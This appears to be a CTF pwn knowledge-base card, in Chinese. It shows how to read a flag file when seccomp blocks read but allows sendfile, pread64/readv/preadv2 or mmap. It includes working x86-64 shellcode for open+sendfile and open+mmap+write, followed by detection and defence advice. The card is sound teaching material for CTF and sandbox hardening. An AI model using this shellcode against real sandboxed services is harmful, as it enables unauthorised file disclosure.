---
id: binary-pwn-sandbox-escape-orw-missing-read-sendfile-preadv-mmap
title: ORW 缺 read：用 sendfile 零拷贝、pread64/readv/preadv2 或 mmap 映射文件替代 read 读出 flag
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: orw-missing-read-syscall-substitution
tags:
- binary
- pwn
- shellcode
- orw
- seccomp
- sandbox-escape
- sendfile
- preadv
- mmap
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:35:31+08:00'
  notes: 已对照原文（无图片）核对：ORW缺R列出的sendfile、pread64/readv/preadv/preadv2、mmap三条替代路径与原文一致；sendfile(1,fd,NULL,0x100)号40、mmap号9参数顺序(PROT_READ,flags,fd)均正确。已修正卡内mmap flags标注为MAP_SHARED（原文代码mov r10,1即MAP_SHARED，原注释'共享映射'）。未验证点：未运行shellcode；原文mmap示例的r8/r9实际值为0与注释34不完全一致，按原文保留代码。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-orw-missing-read-sendfile-preadv-mmap/
draft: false
kb_aliases:
- ORW 缺 R
- seccomp 禁 read 读 flag
- sendfile 读 flag
- pread64 readv preadv2
- mmap 文件映射读 flag
- ORW syscall 替代
---

## 一句话结论

当 seccomp 只禁掉 `read`（或 `read` 被白名单排除）但 flag 文件仍可打开时，不必放弃：可用 `sendfile(1, fd, NULL, len)` 把文件内容零拷贝直接送到 stdout，或用 `pread64`/`readv`/`preadv`/`preadv2` 这些与 `read` 语义等价但系统调用号不同的接口读取到用户缓冲区，或在 `open` 后用 `mmap` 把文件映射进内存再从映射区 `write` 输出。

## 原理

- **seccomp 按系统调用号过滤**：黑名单/白名单只识别 `read`（x86-64 号 0）时，`pread64`(17)、`readv`(19)、`preadv`(295)、`preadv2`(327) 都是独立编号的系统调用，语义上都从文件描述符读数据，却不会被同一条规则拦截。这是“同一能力、不同入口”的过滤粒度问题。
- **sendfile(40) 不经过用户态缓冲区**：`sendfile(out_fd, in_fd, offset, count)` 在内核里把文件页直接搬到输出 fd。把 `out_fd=1`、`in_fd=open("flag")` 的返回值、`offset=NULL`（从当前偏移读）、`count=0x100`，即可只靠 `open`+`sendfile` 两条系统调用把 flag 送到 socket/stdout；完全不需要 `read`。
- **pread 系列与 read 的差异**：`pread64(fd, buf, count, offset)` 带显式偏移且不改变文件偏移；`readv(fd, iov, iovcnt)` 把数据分散读到多个缓冲区；`preadv`/`preadv2` 是带偏移的向量读。只要过滤器没有按这些编号单独禁止，它们就能完成同样的读取。
- **mmap 把文件映射成内存**：`mmap(addr, length, PROT_READ, MAP_SHARED, fd, 0)` 将文件页映射到进程地址空间，随后对映射区做 `write(1, addr, length)` 即可输出。它把“读文件”拆成“建立映射 + 内存写出”，绕开 `read` 这一环；`mmap` 号 9，参数顺序为 `rdi=addr, rsi=len, rdx=prot, r10=flags, r8=fd, r9=offset`。
- **为什么成立**：安全边界若只列举“危险调用名”，攻击者总能找到内核提供的等价接口。真正的边界应按能力（文件读、写 socket、执行）设计，或使用白名单把可用调用压到最小。
- **边界**：`sendfile` 要求输出 fd 支持 `sendpage`（socket/普通文件可以，部分特殊 fd 不行）；`pread*` 要求 fd 可 seek（普通文件可以，管道/终端会 `ESPIPE`）；`mmap` 要求文件可读且映射长度按页对齐；若 `open`/`openat` 也同时被禁，则需先解决打开问题（见缺 O 卡）。

## 触发条件

- 题目允许执行用户 shellcode，flag 位于进程可读的固定路径（如 `./flag`），文件名可硬编码。
- seccomp 禁用 `read`（或只用白名单排除了 `read`），但 `open`/`openat` 与至少一种替代读取接口（`sendfile`、`pread64`、`readv`、`preadv`、`preadv2`、`mmap`）被放行。
- 输出端 `write`/`sendfile` 之一可用；`sendfile` 方案要求 fd 1 是 socket/普通文件等支持零拷贝输出的对象。
- 攻击者能先 `seccomp-tools dump` 或读 BPF 确认实际放行集合。

## 利用步骤

1. dump 过滤器，列出被禁与放行的系统调用号；确认 `open`/`openat` 可用、`read` 被禁，并挑一个允许的替代读取调用。
2. 打开 flag：`open("flag", O_RDONLY)`（或 `openat(AT_FDCWD, "flag", 0)`），把返回 fd 保存在寄存器中。
3. 按可用接口选择：
   - **sendfile**：`sendfile(1, fd, NULL, 0x100)`，一条调用直接输出，最短。
   - **pread64**：`pread64(fd, rsp, 0x100, 0)`，把文件读进栈后再 `write(1, rsp, 0x100)`。
   - **readv**：在栈上布置 `struct iovec { base, len }`，`readv(fd, iov, 1)` 后 `write`。
   - **preadv/preadv2**：与 readv 类似，额外在 `r10` 传偏移（preadv2 还有 flags）。
   - **mmap**：`mmap(0x2333000, 0x1000, PROT_READ, MAP_SHARED, fd, 0)`，再 `write(1, 0x2333000, 0x100)`；映射地址可选固定值以便后续引用。
4. 组装成一段 shellcode 发送；若目标还有字节/长度过滤，再套用可见字符编码或自修改技巧（见关联卡）。
5. 用本地 `seccomp-tools`/`strace` 复核没有触发被禁调用，再打远程。

## PoC

原文 sendfile 版基础 ORW（x86-64，GNU as 语法）：

```asm
/* open("flag", O_RDONLY) */
push 0x67616c66        /* "flag" */
push 2
pop rax
mov rdi, rsp
xor esi, esi
cdq
syscall

/* sendfile(1, fd, NULL, 0x100) —— 系统调用号 0x28=40 */
mov r10d, 0x100
mov rsi, rax           /* in_fd = open 返回值 */
push 40
pop rax
push 1
pop rdi
cdq                    /* rdx = 0，offset=NULL */
syscall
```

原文 mmap 版（读文件到映射区再 write）：

```asm
/* open("flag",0)：原文用 push 0x67616c662f2e 形式，注意按实际路径调整 */
mov rax, 0x67616c662f2e
push rax
mov rdi, rsp
xor edx, edx
xor esi, esi
mov rax, 2
syscall

/* mmap(0x23330000,0x1000,PROT_READ,MAP_SHARED,fd,0)
   rdi=addr, rsi=len, rdx=prot, r10=flags, r8=fd, r9=offset */
mov rsi, 0x1000
mov r10, 1             /* MAP_SHARED */
mov r9d, 0
mov r8d, eax           /* fd */
mov edx, 1             /* PROT_READ */
mov edi, 0x2333000
mov rax, 9
syscall

/* write(1, 0x2333000, 0x100) */
mov rdi, 1
mov rsi, 0x2333000
mov rdx, 0x100
mov rax, 1
syscall
```

说明：原文两段均为示意，未在文中标注目标 seccomp dump 的具体放行项；实际使用时须按目标过滤器选择调用。`sendfile` 的 `offset` 用 `NULL` 表示从文件当前偏移读。

## 变体与关联

- **sendfile + splice**：`sendfile` 被禁时可用 `pipe`+`splice` 把文件页搬到 socket；见 [[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]（那篇是 open/openat 被禁，另用 openat2 打开）。
- **mmap 后不 write**：若 `write` 也禁，可把映射内容逐字节比较后用侧信道输出（见缺 W 卡与 [[binary-pwn-sandbox-escape-orw-flag-byte-bruteforce-time-clean-oracle]]）。
- **open 同时被禁**：改用 `openat2`/`openat` 或 retfq 32 位 open，见缺 O 卡与 [[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]。
- **过滤器白名单只留 write**：此时读取与打开都不可用，只能改为侧信道爆破（如 exit 状态、连接时序），见关联卡。
- **关联**：[[binary-pwn-sandbox-escape-syscall-count-limit-split-byte-selfmodify-open-mmap-write]]（open+mmap+write 与 openat+sendfile 的两次系统调用压缩）、[[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]（字节过滤下调用这些替代接口）。

## 检测与防御

- **检测（出题/防守）**：审计 seccomp 策略时把“等价能力”成组检查：`read`/`pread64`/`readv`/`preadv`/`preadv2`/`sendfile`/`splice`/`mmap` 若目标是防文件读取，应一并限制；运行时监控出现 `open` 后紧跟 `sendfile`/`mmap` 的 shellcode 行为。
- **防御**：用白名单只放行必要调用（例如只允许 `write` 到固定 fd），从能力层面禁止文件打开与读取；关键 flag 由父进程读入并通过管道传入；对 shellcode 输入做长度/字节限制只能增加成本，不能替代 seccomp 能力收紧。
- **注意**：`sendfile` 的 `out_fd` 若为 socket，依然可能把 flag 直接外带；不要只禁 `read` 而放行 `sendfile`。
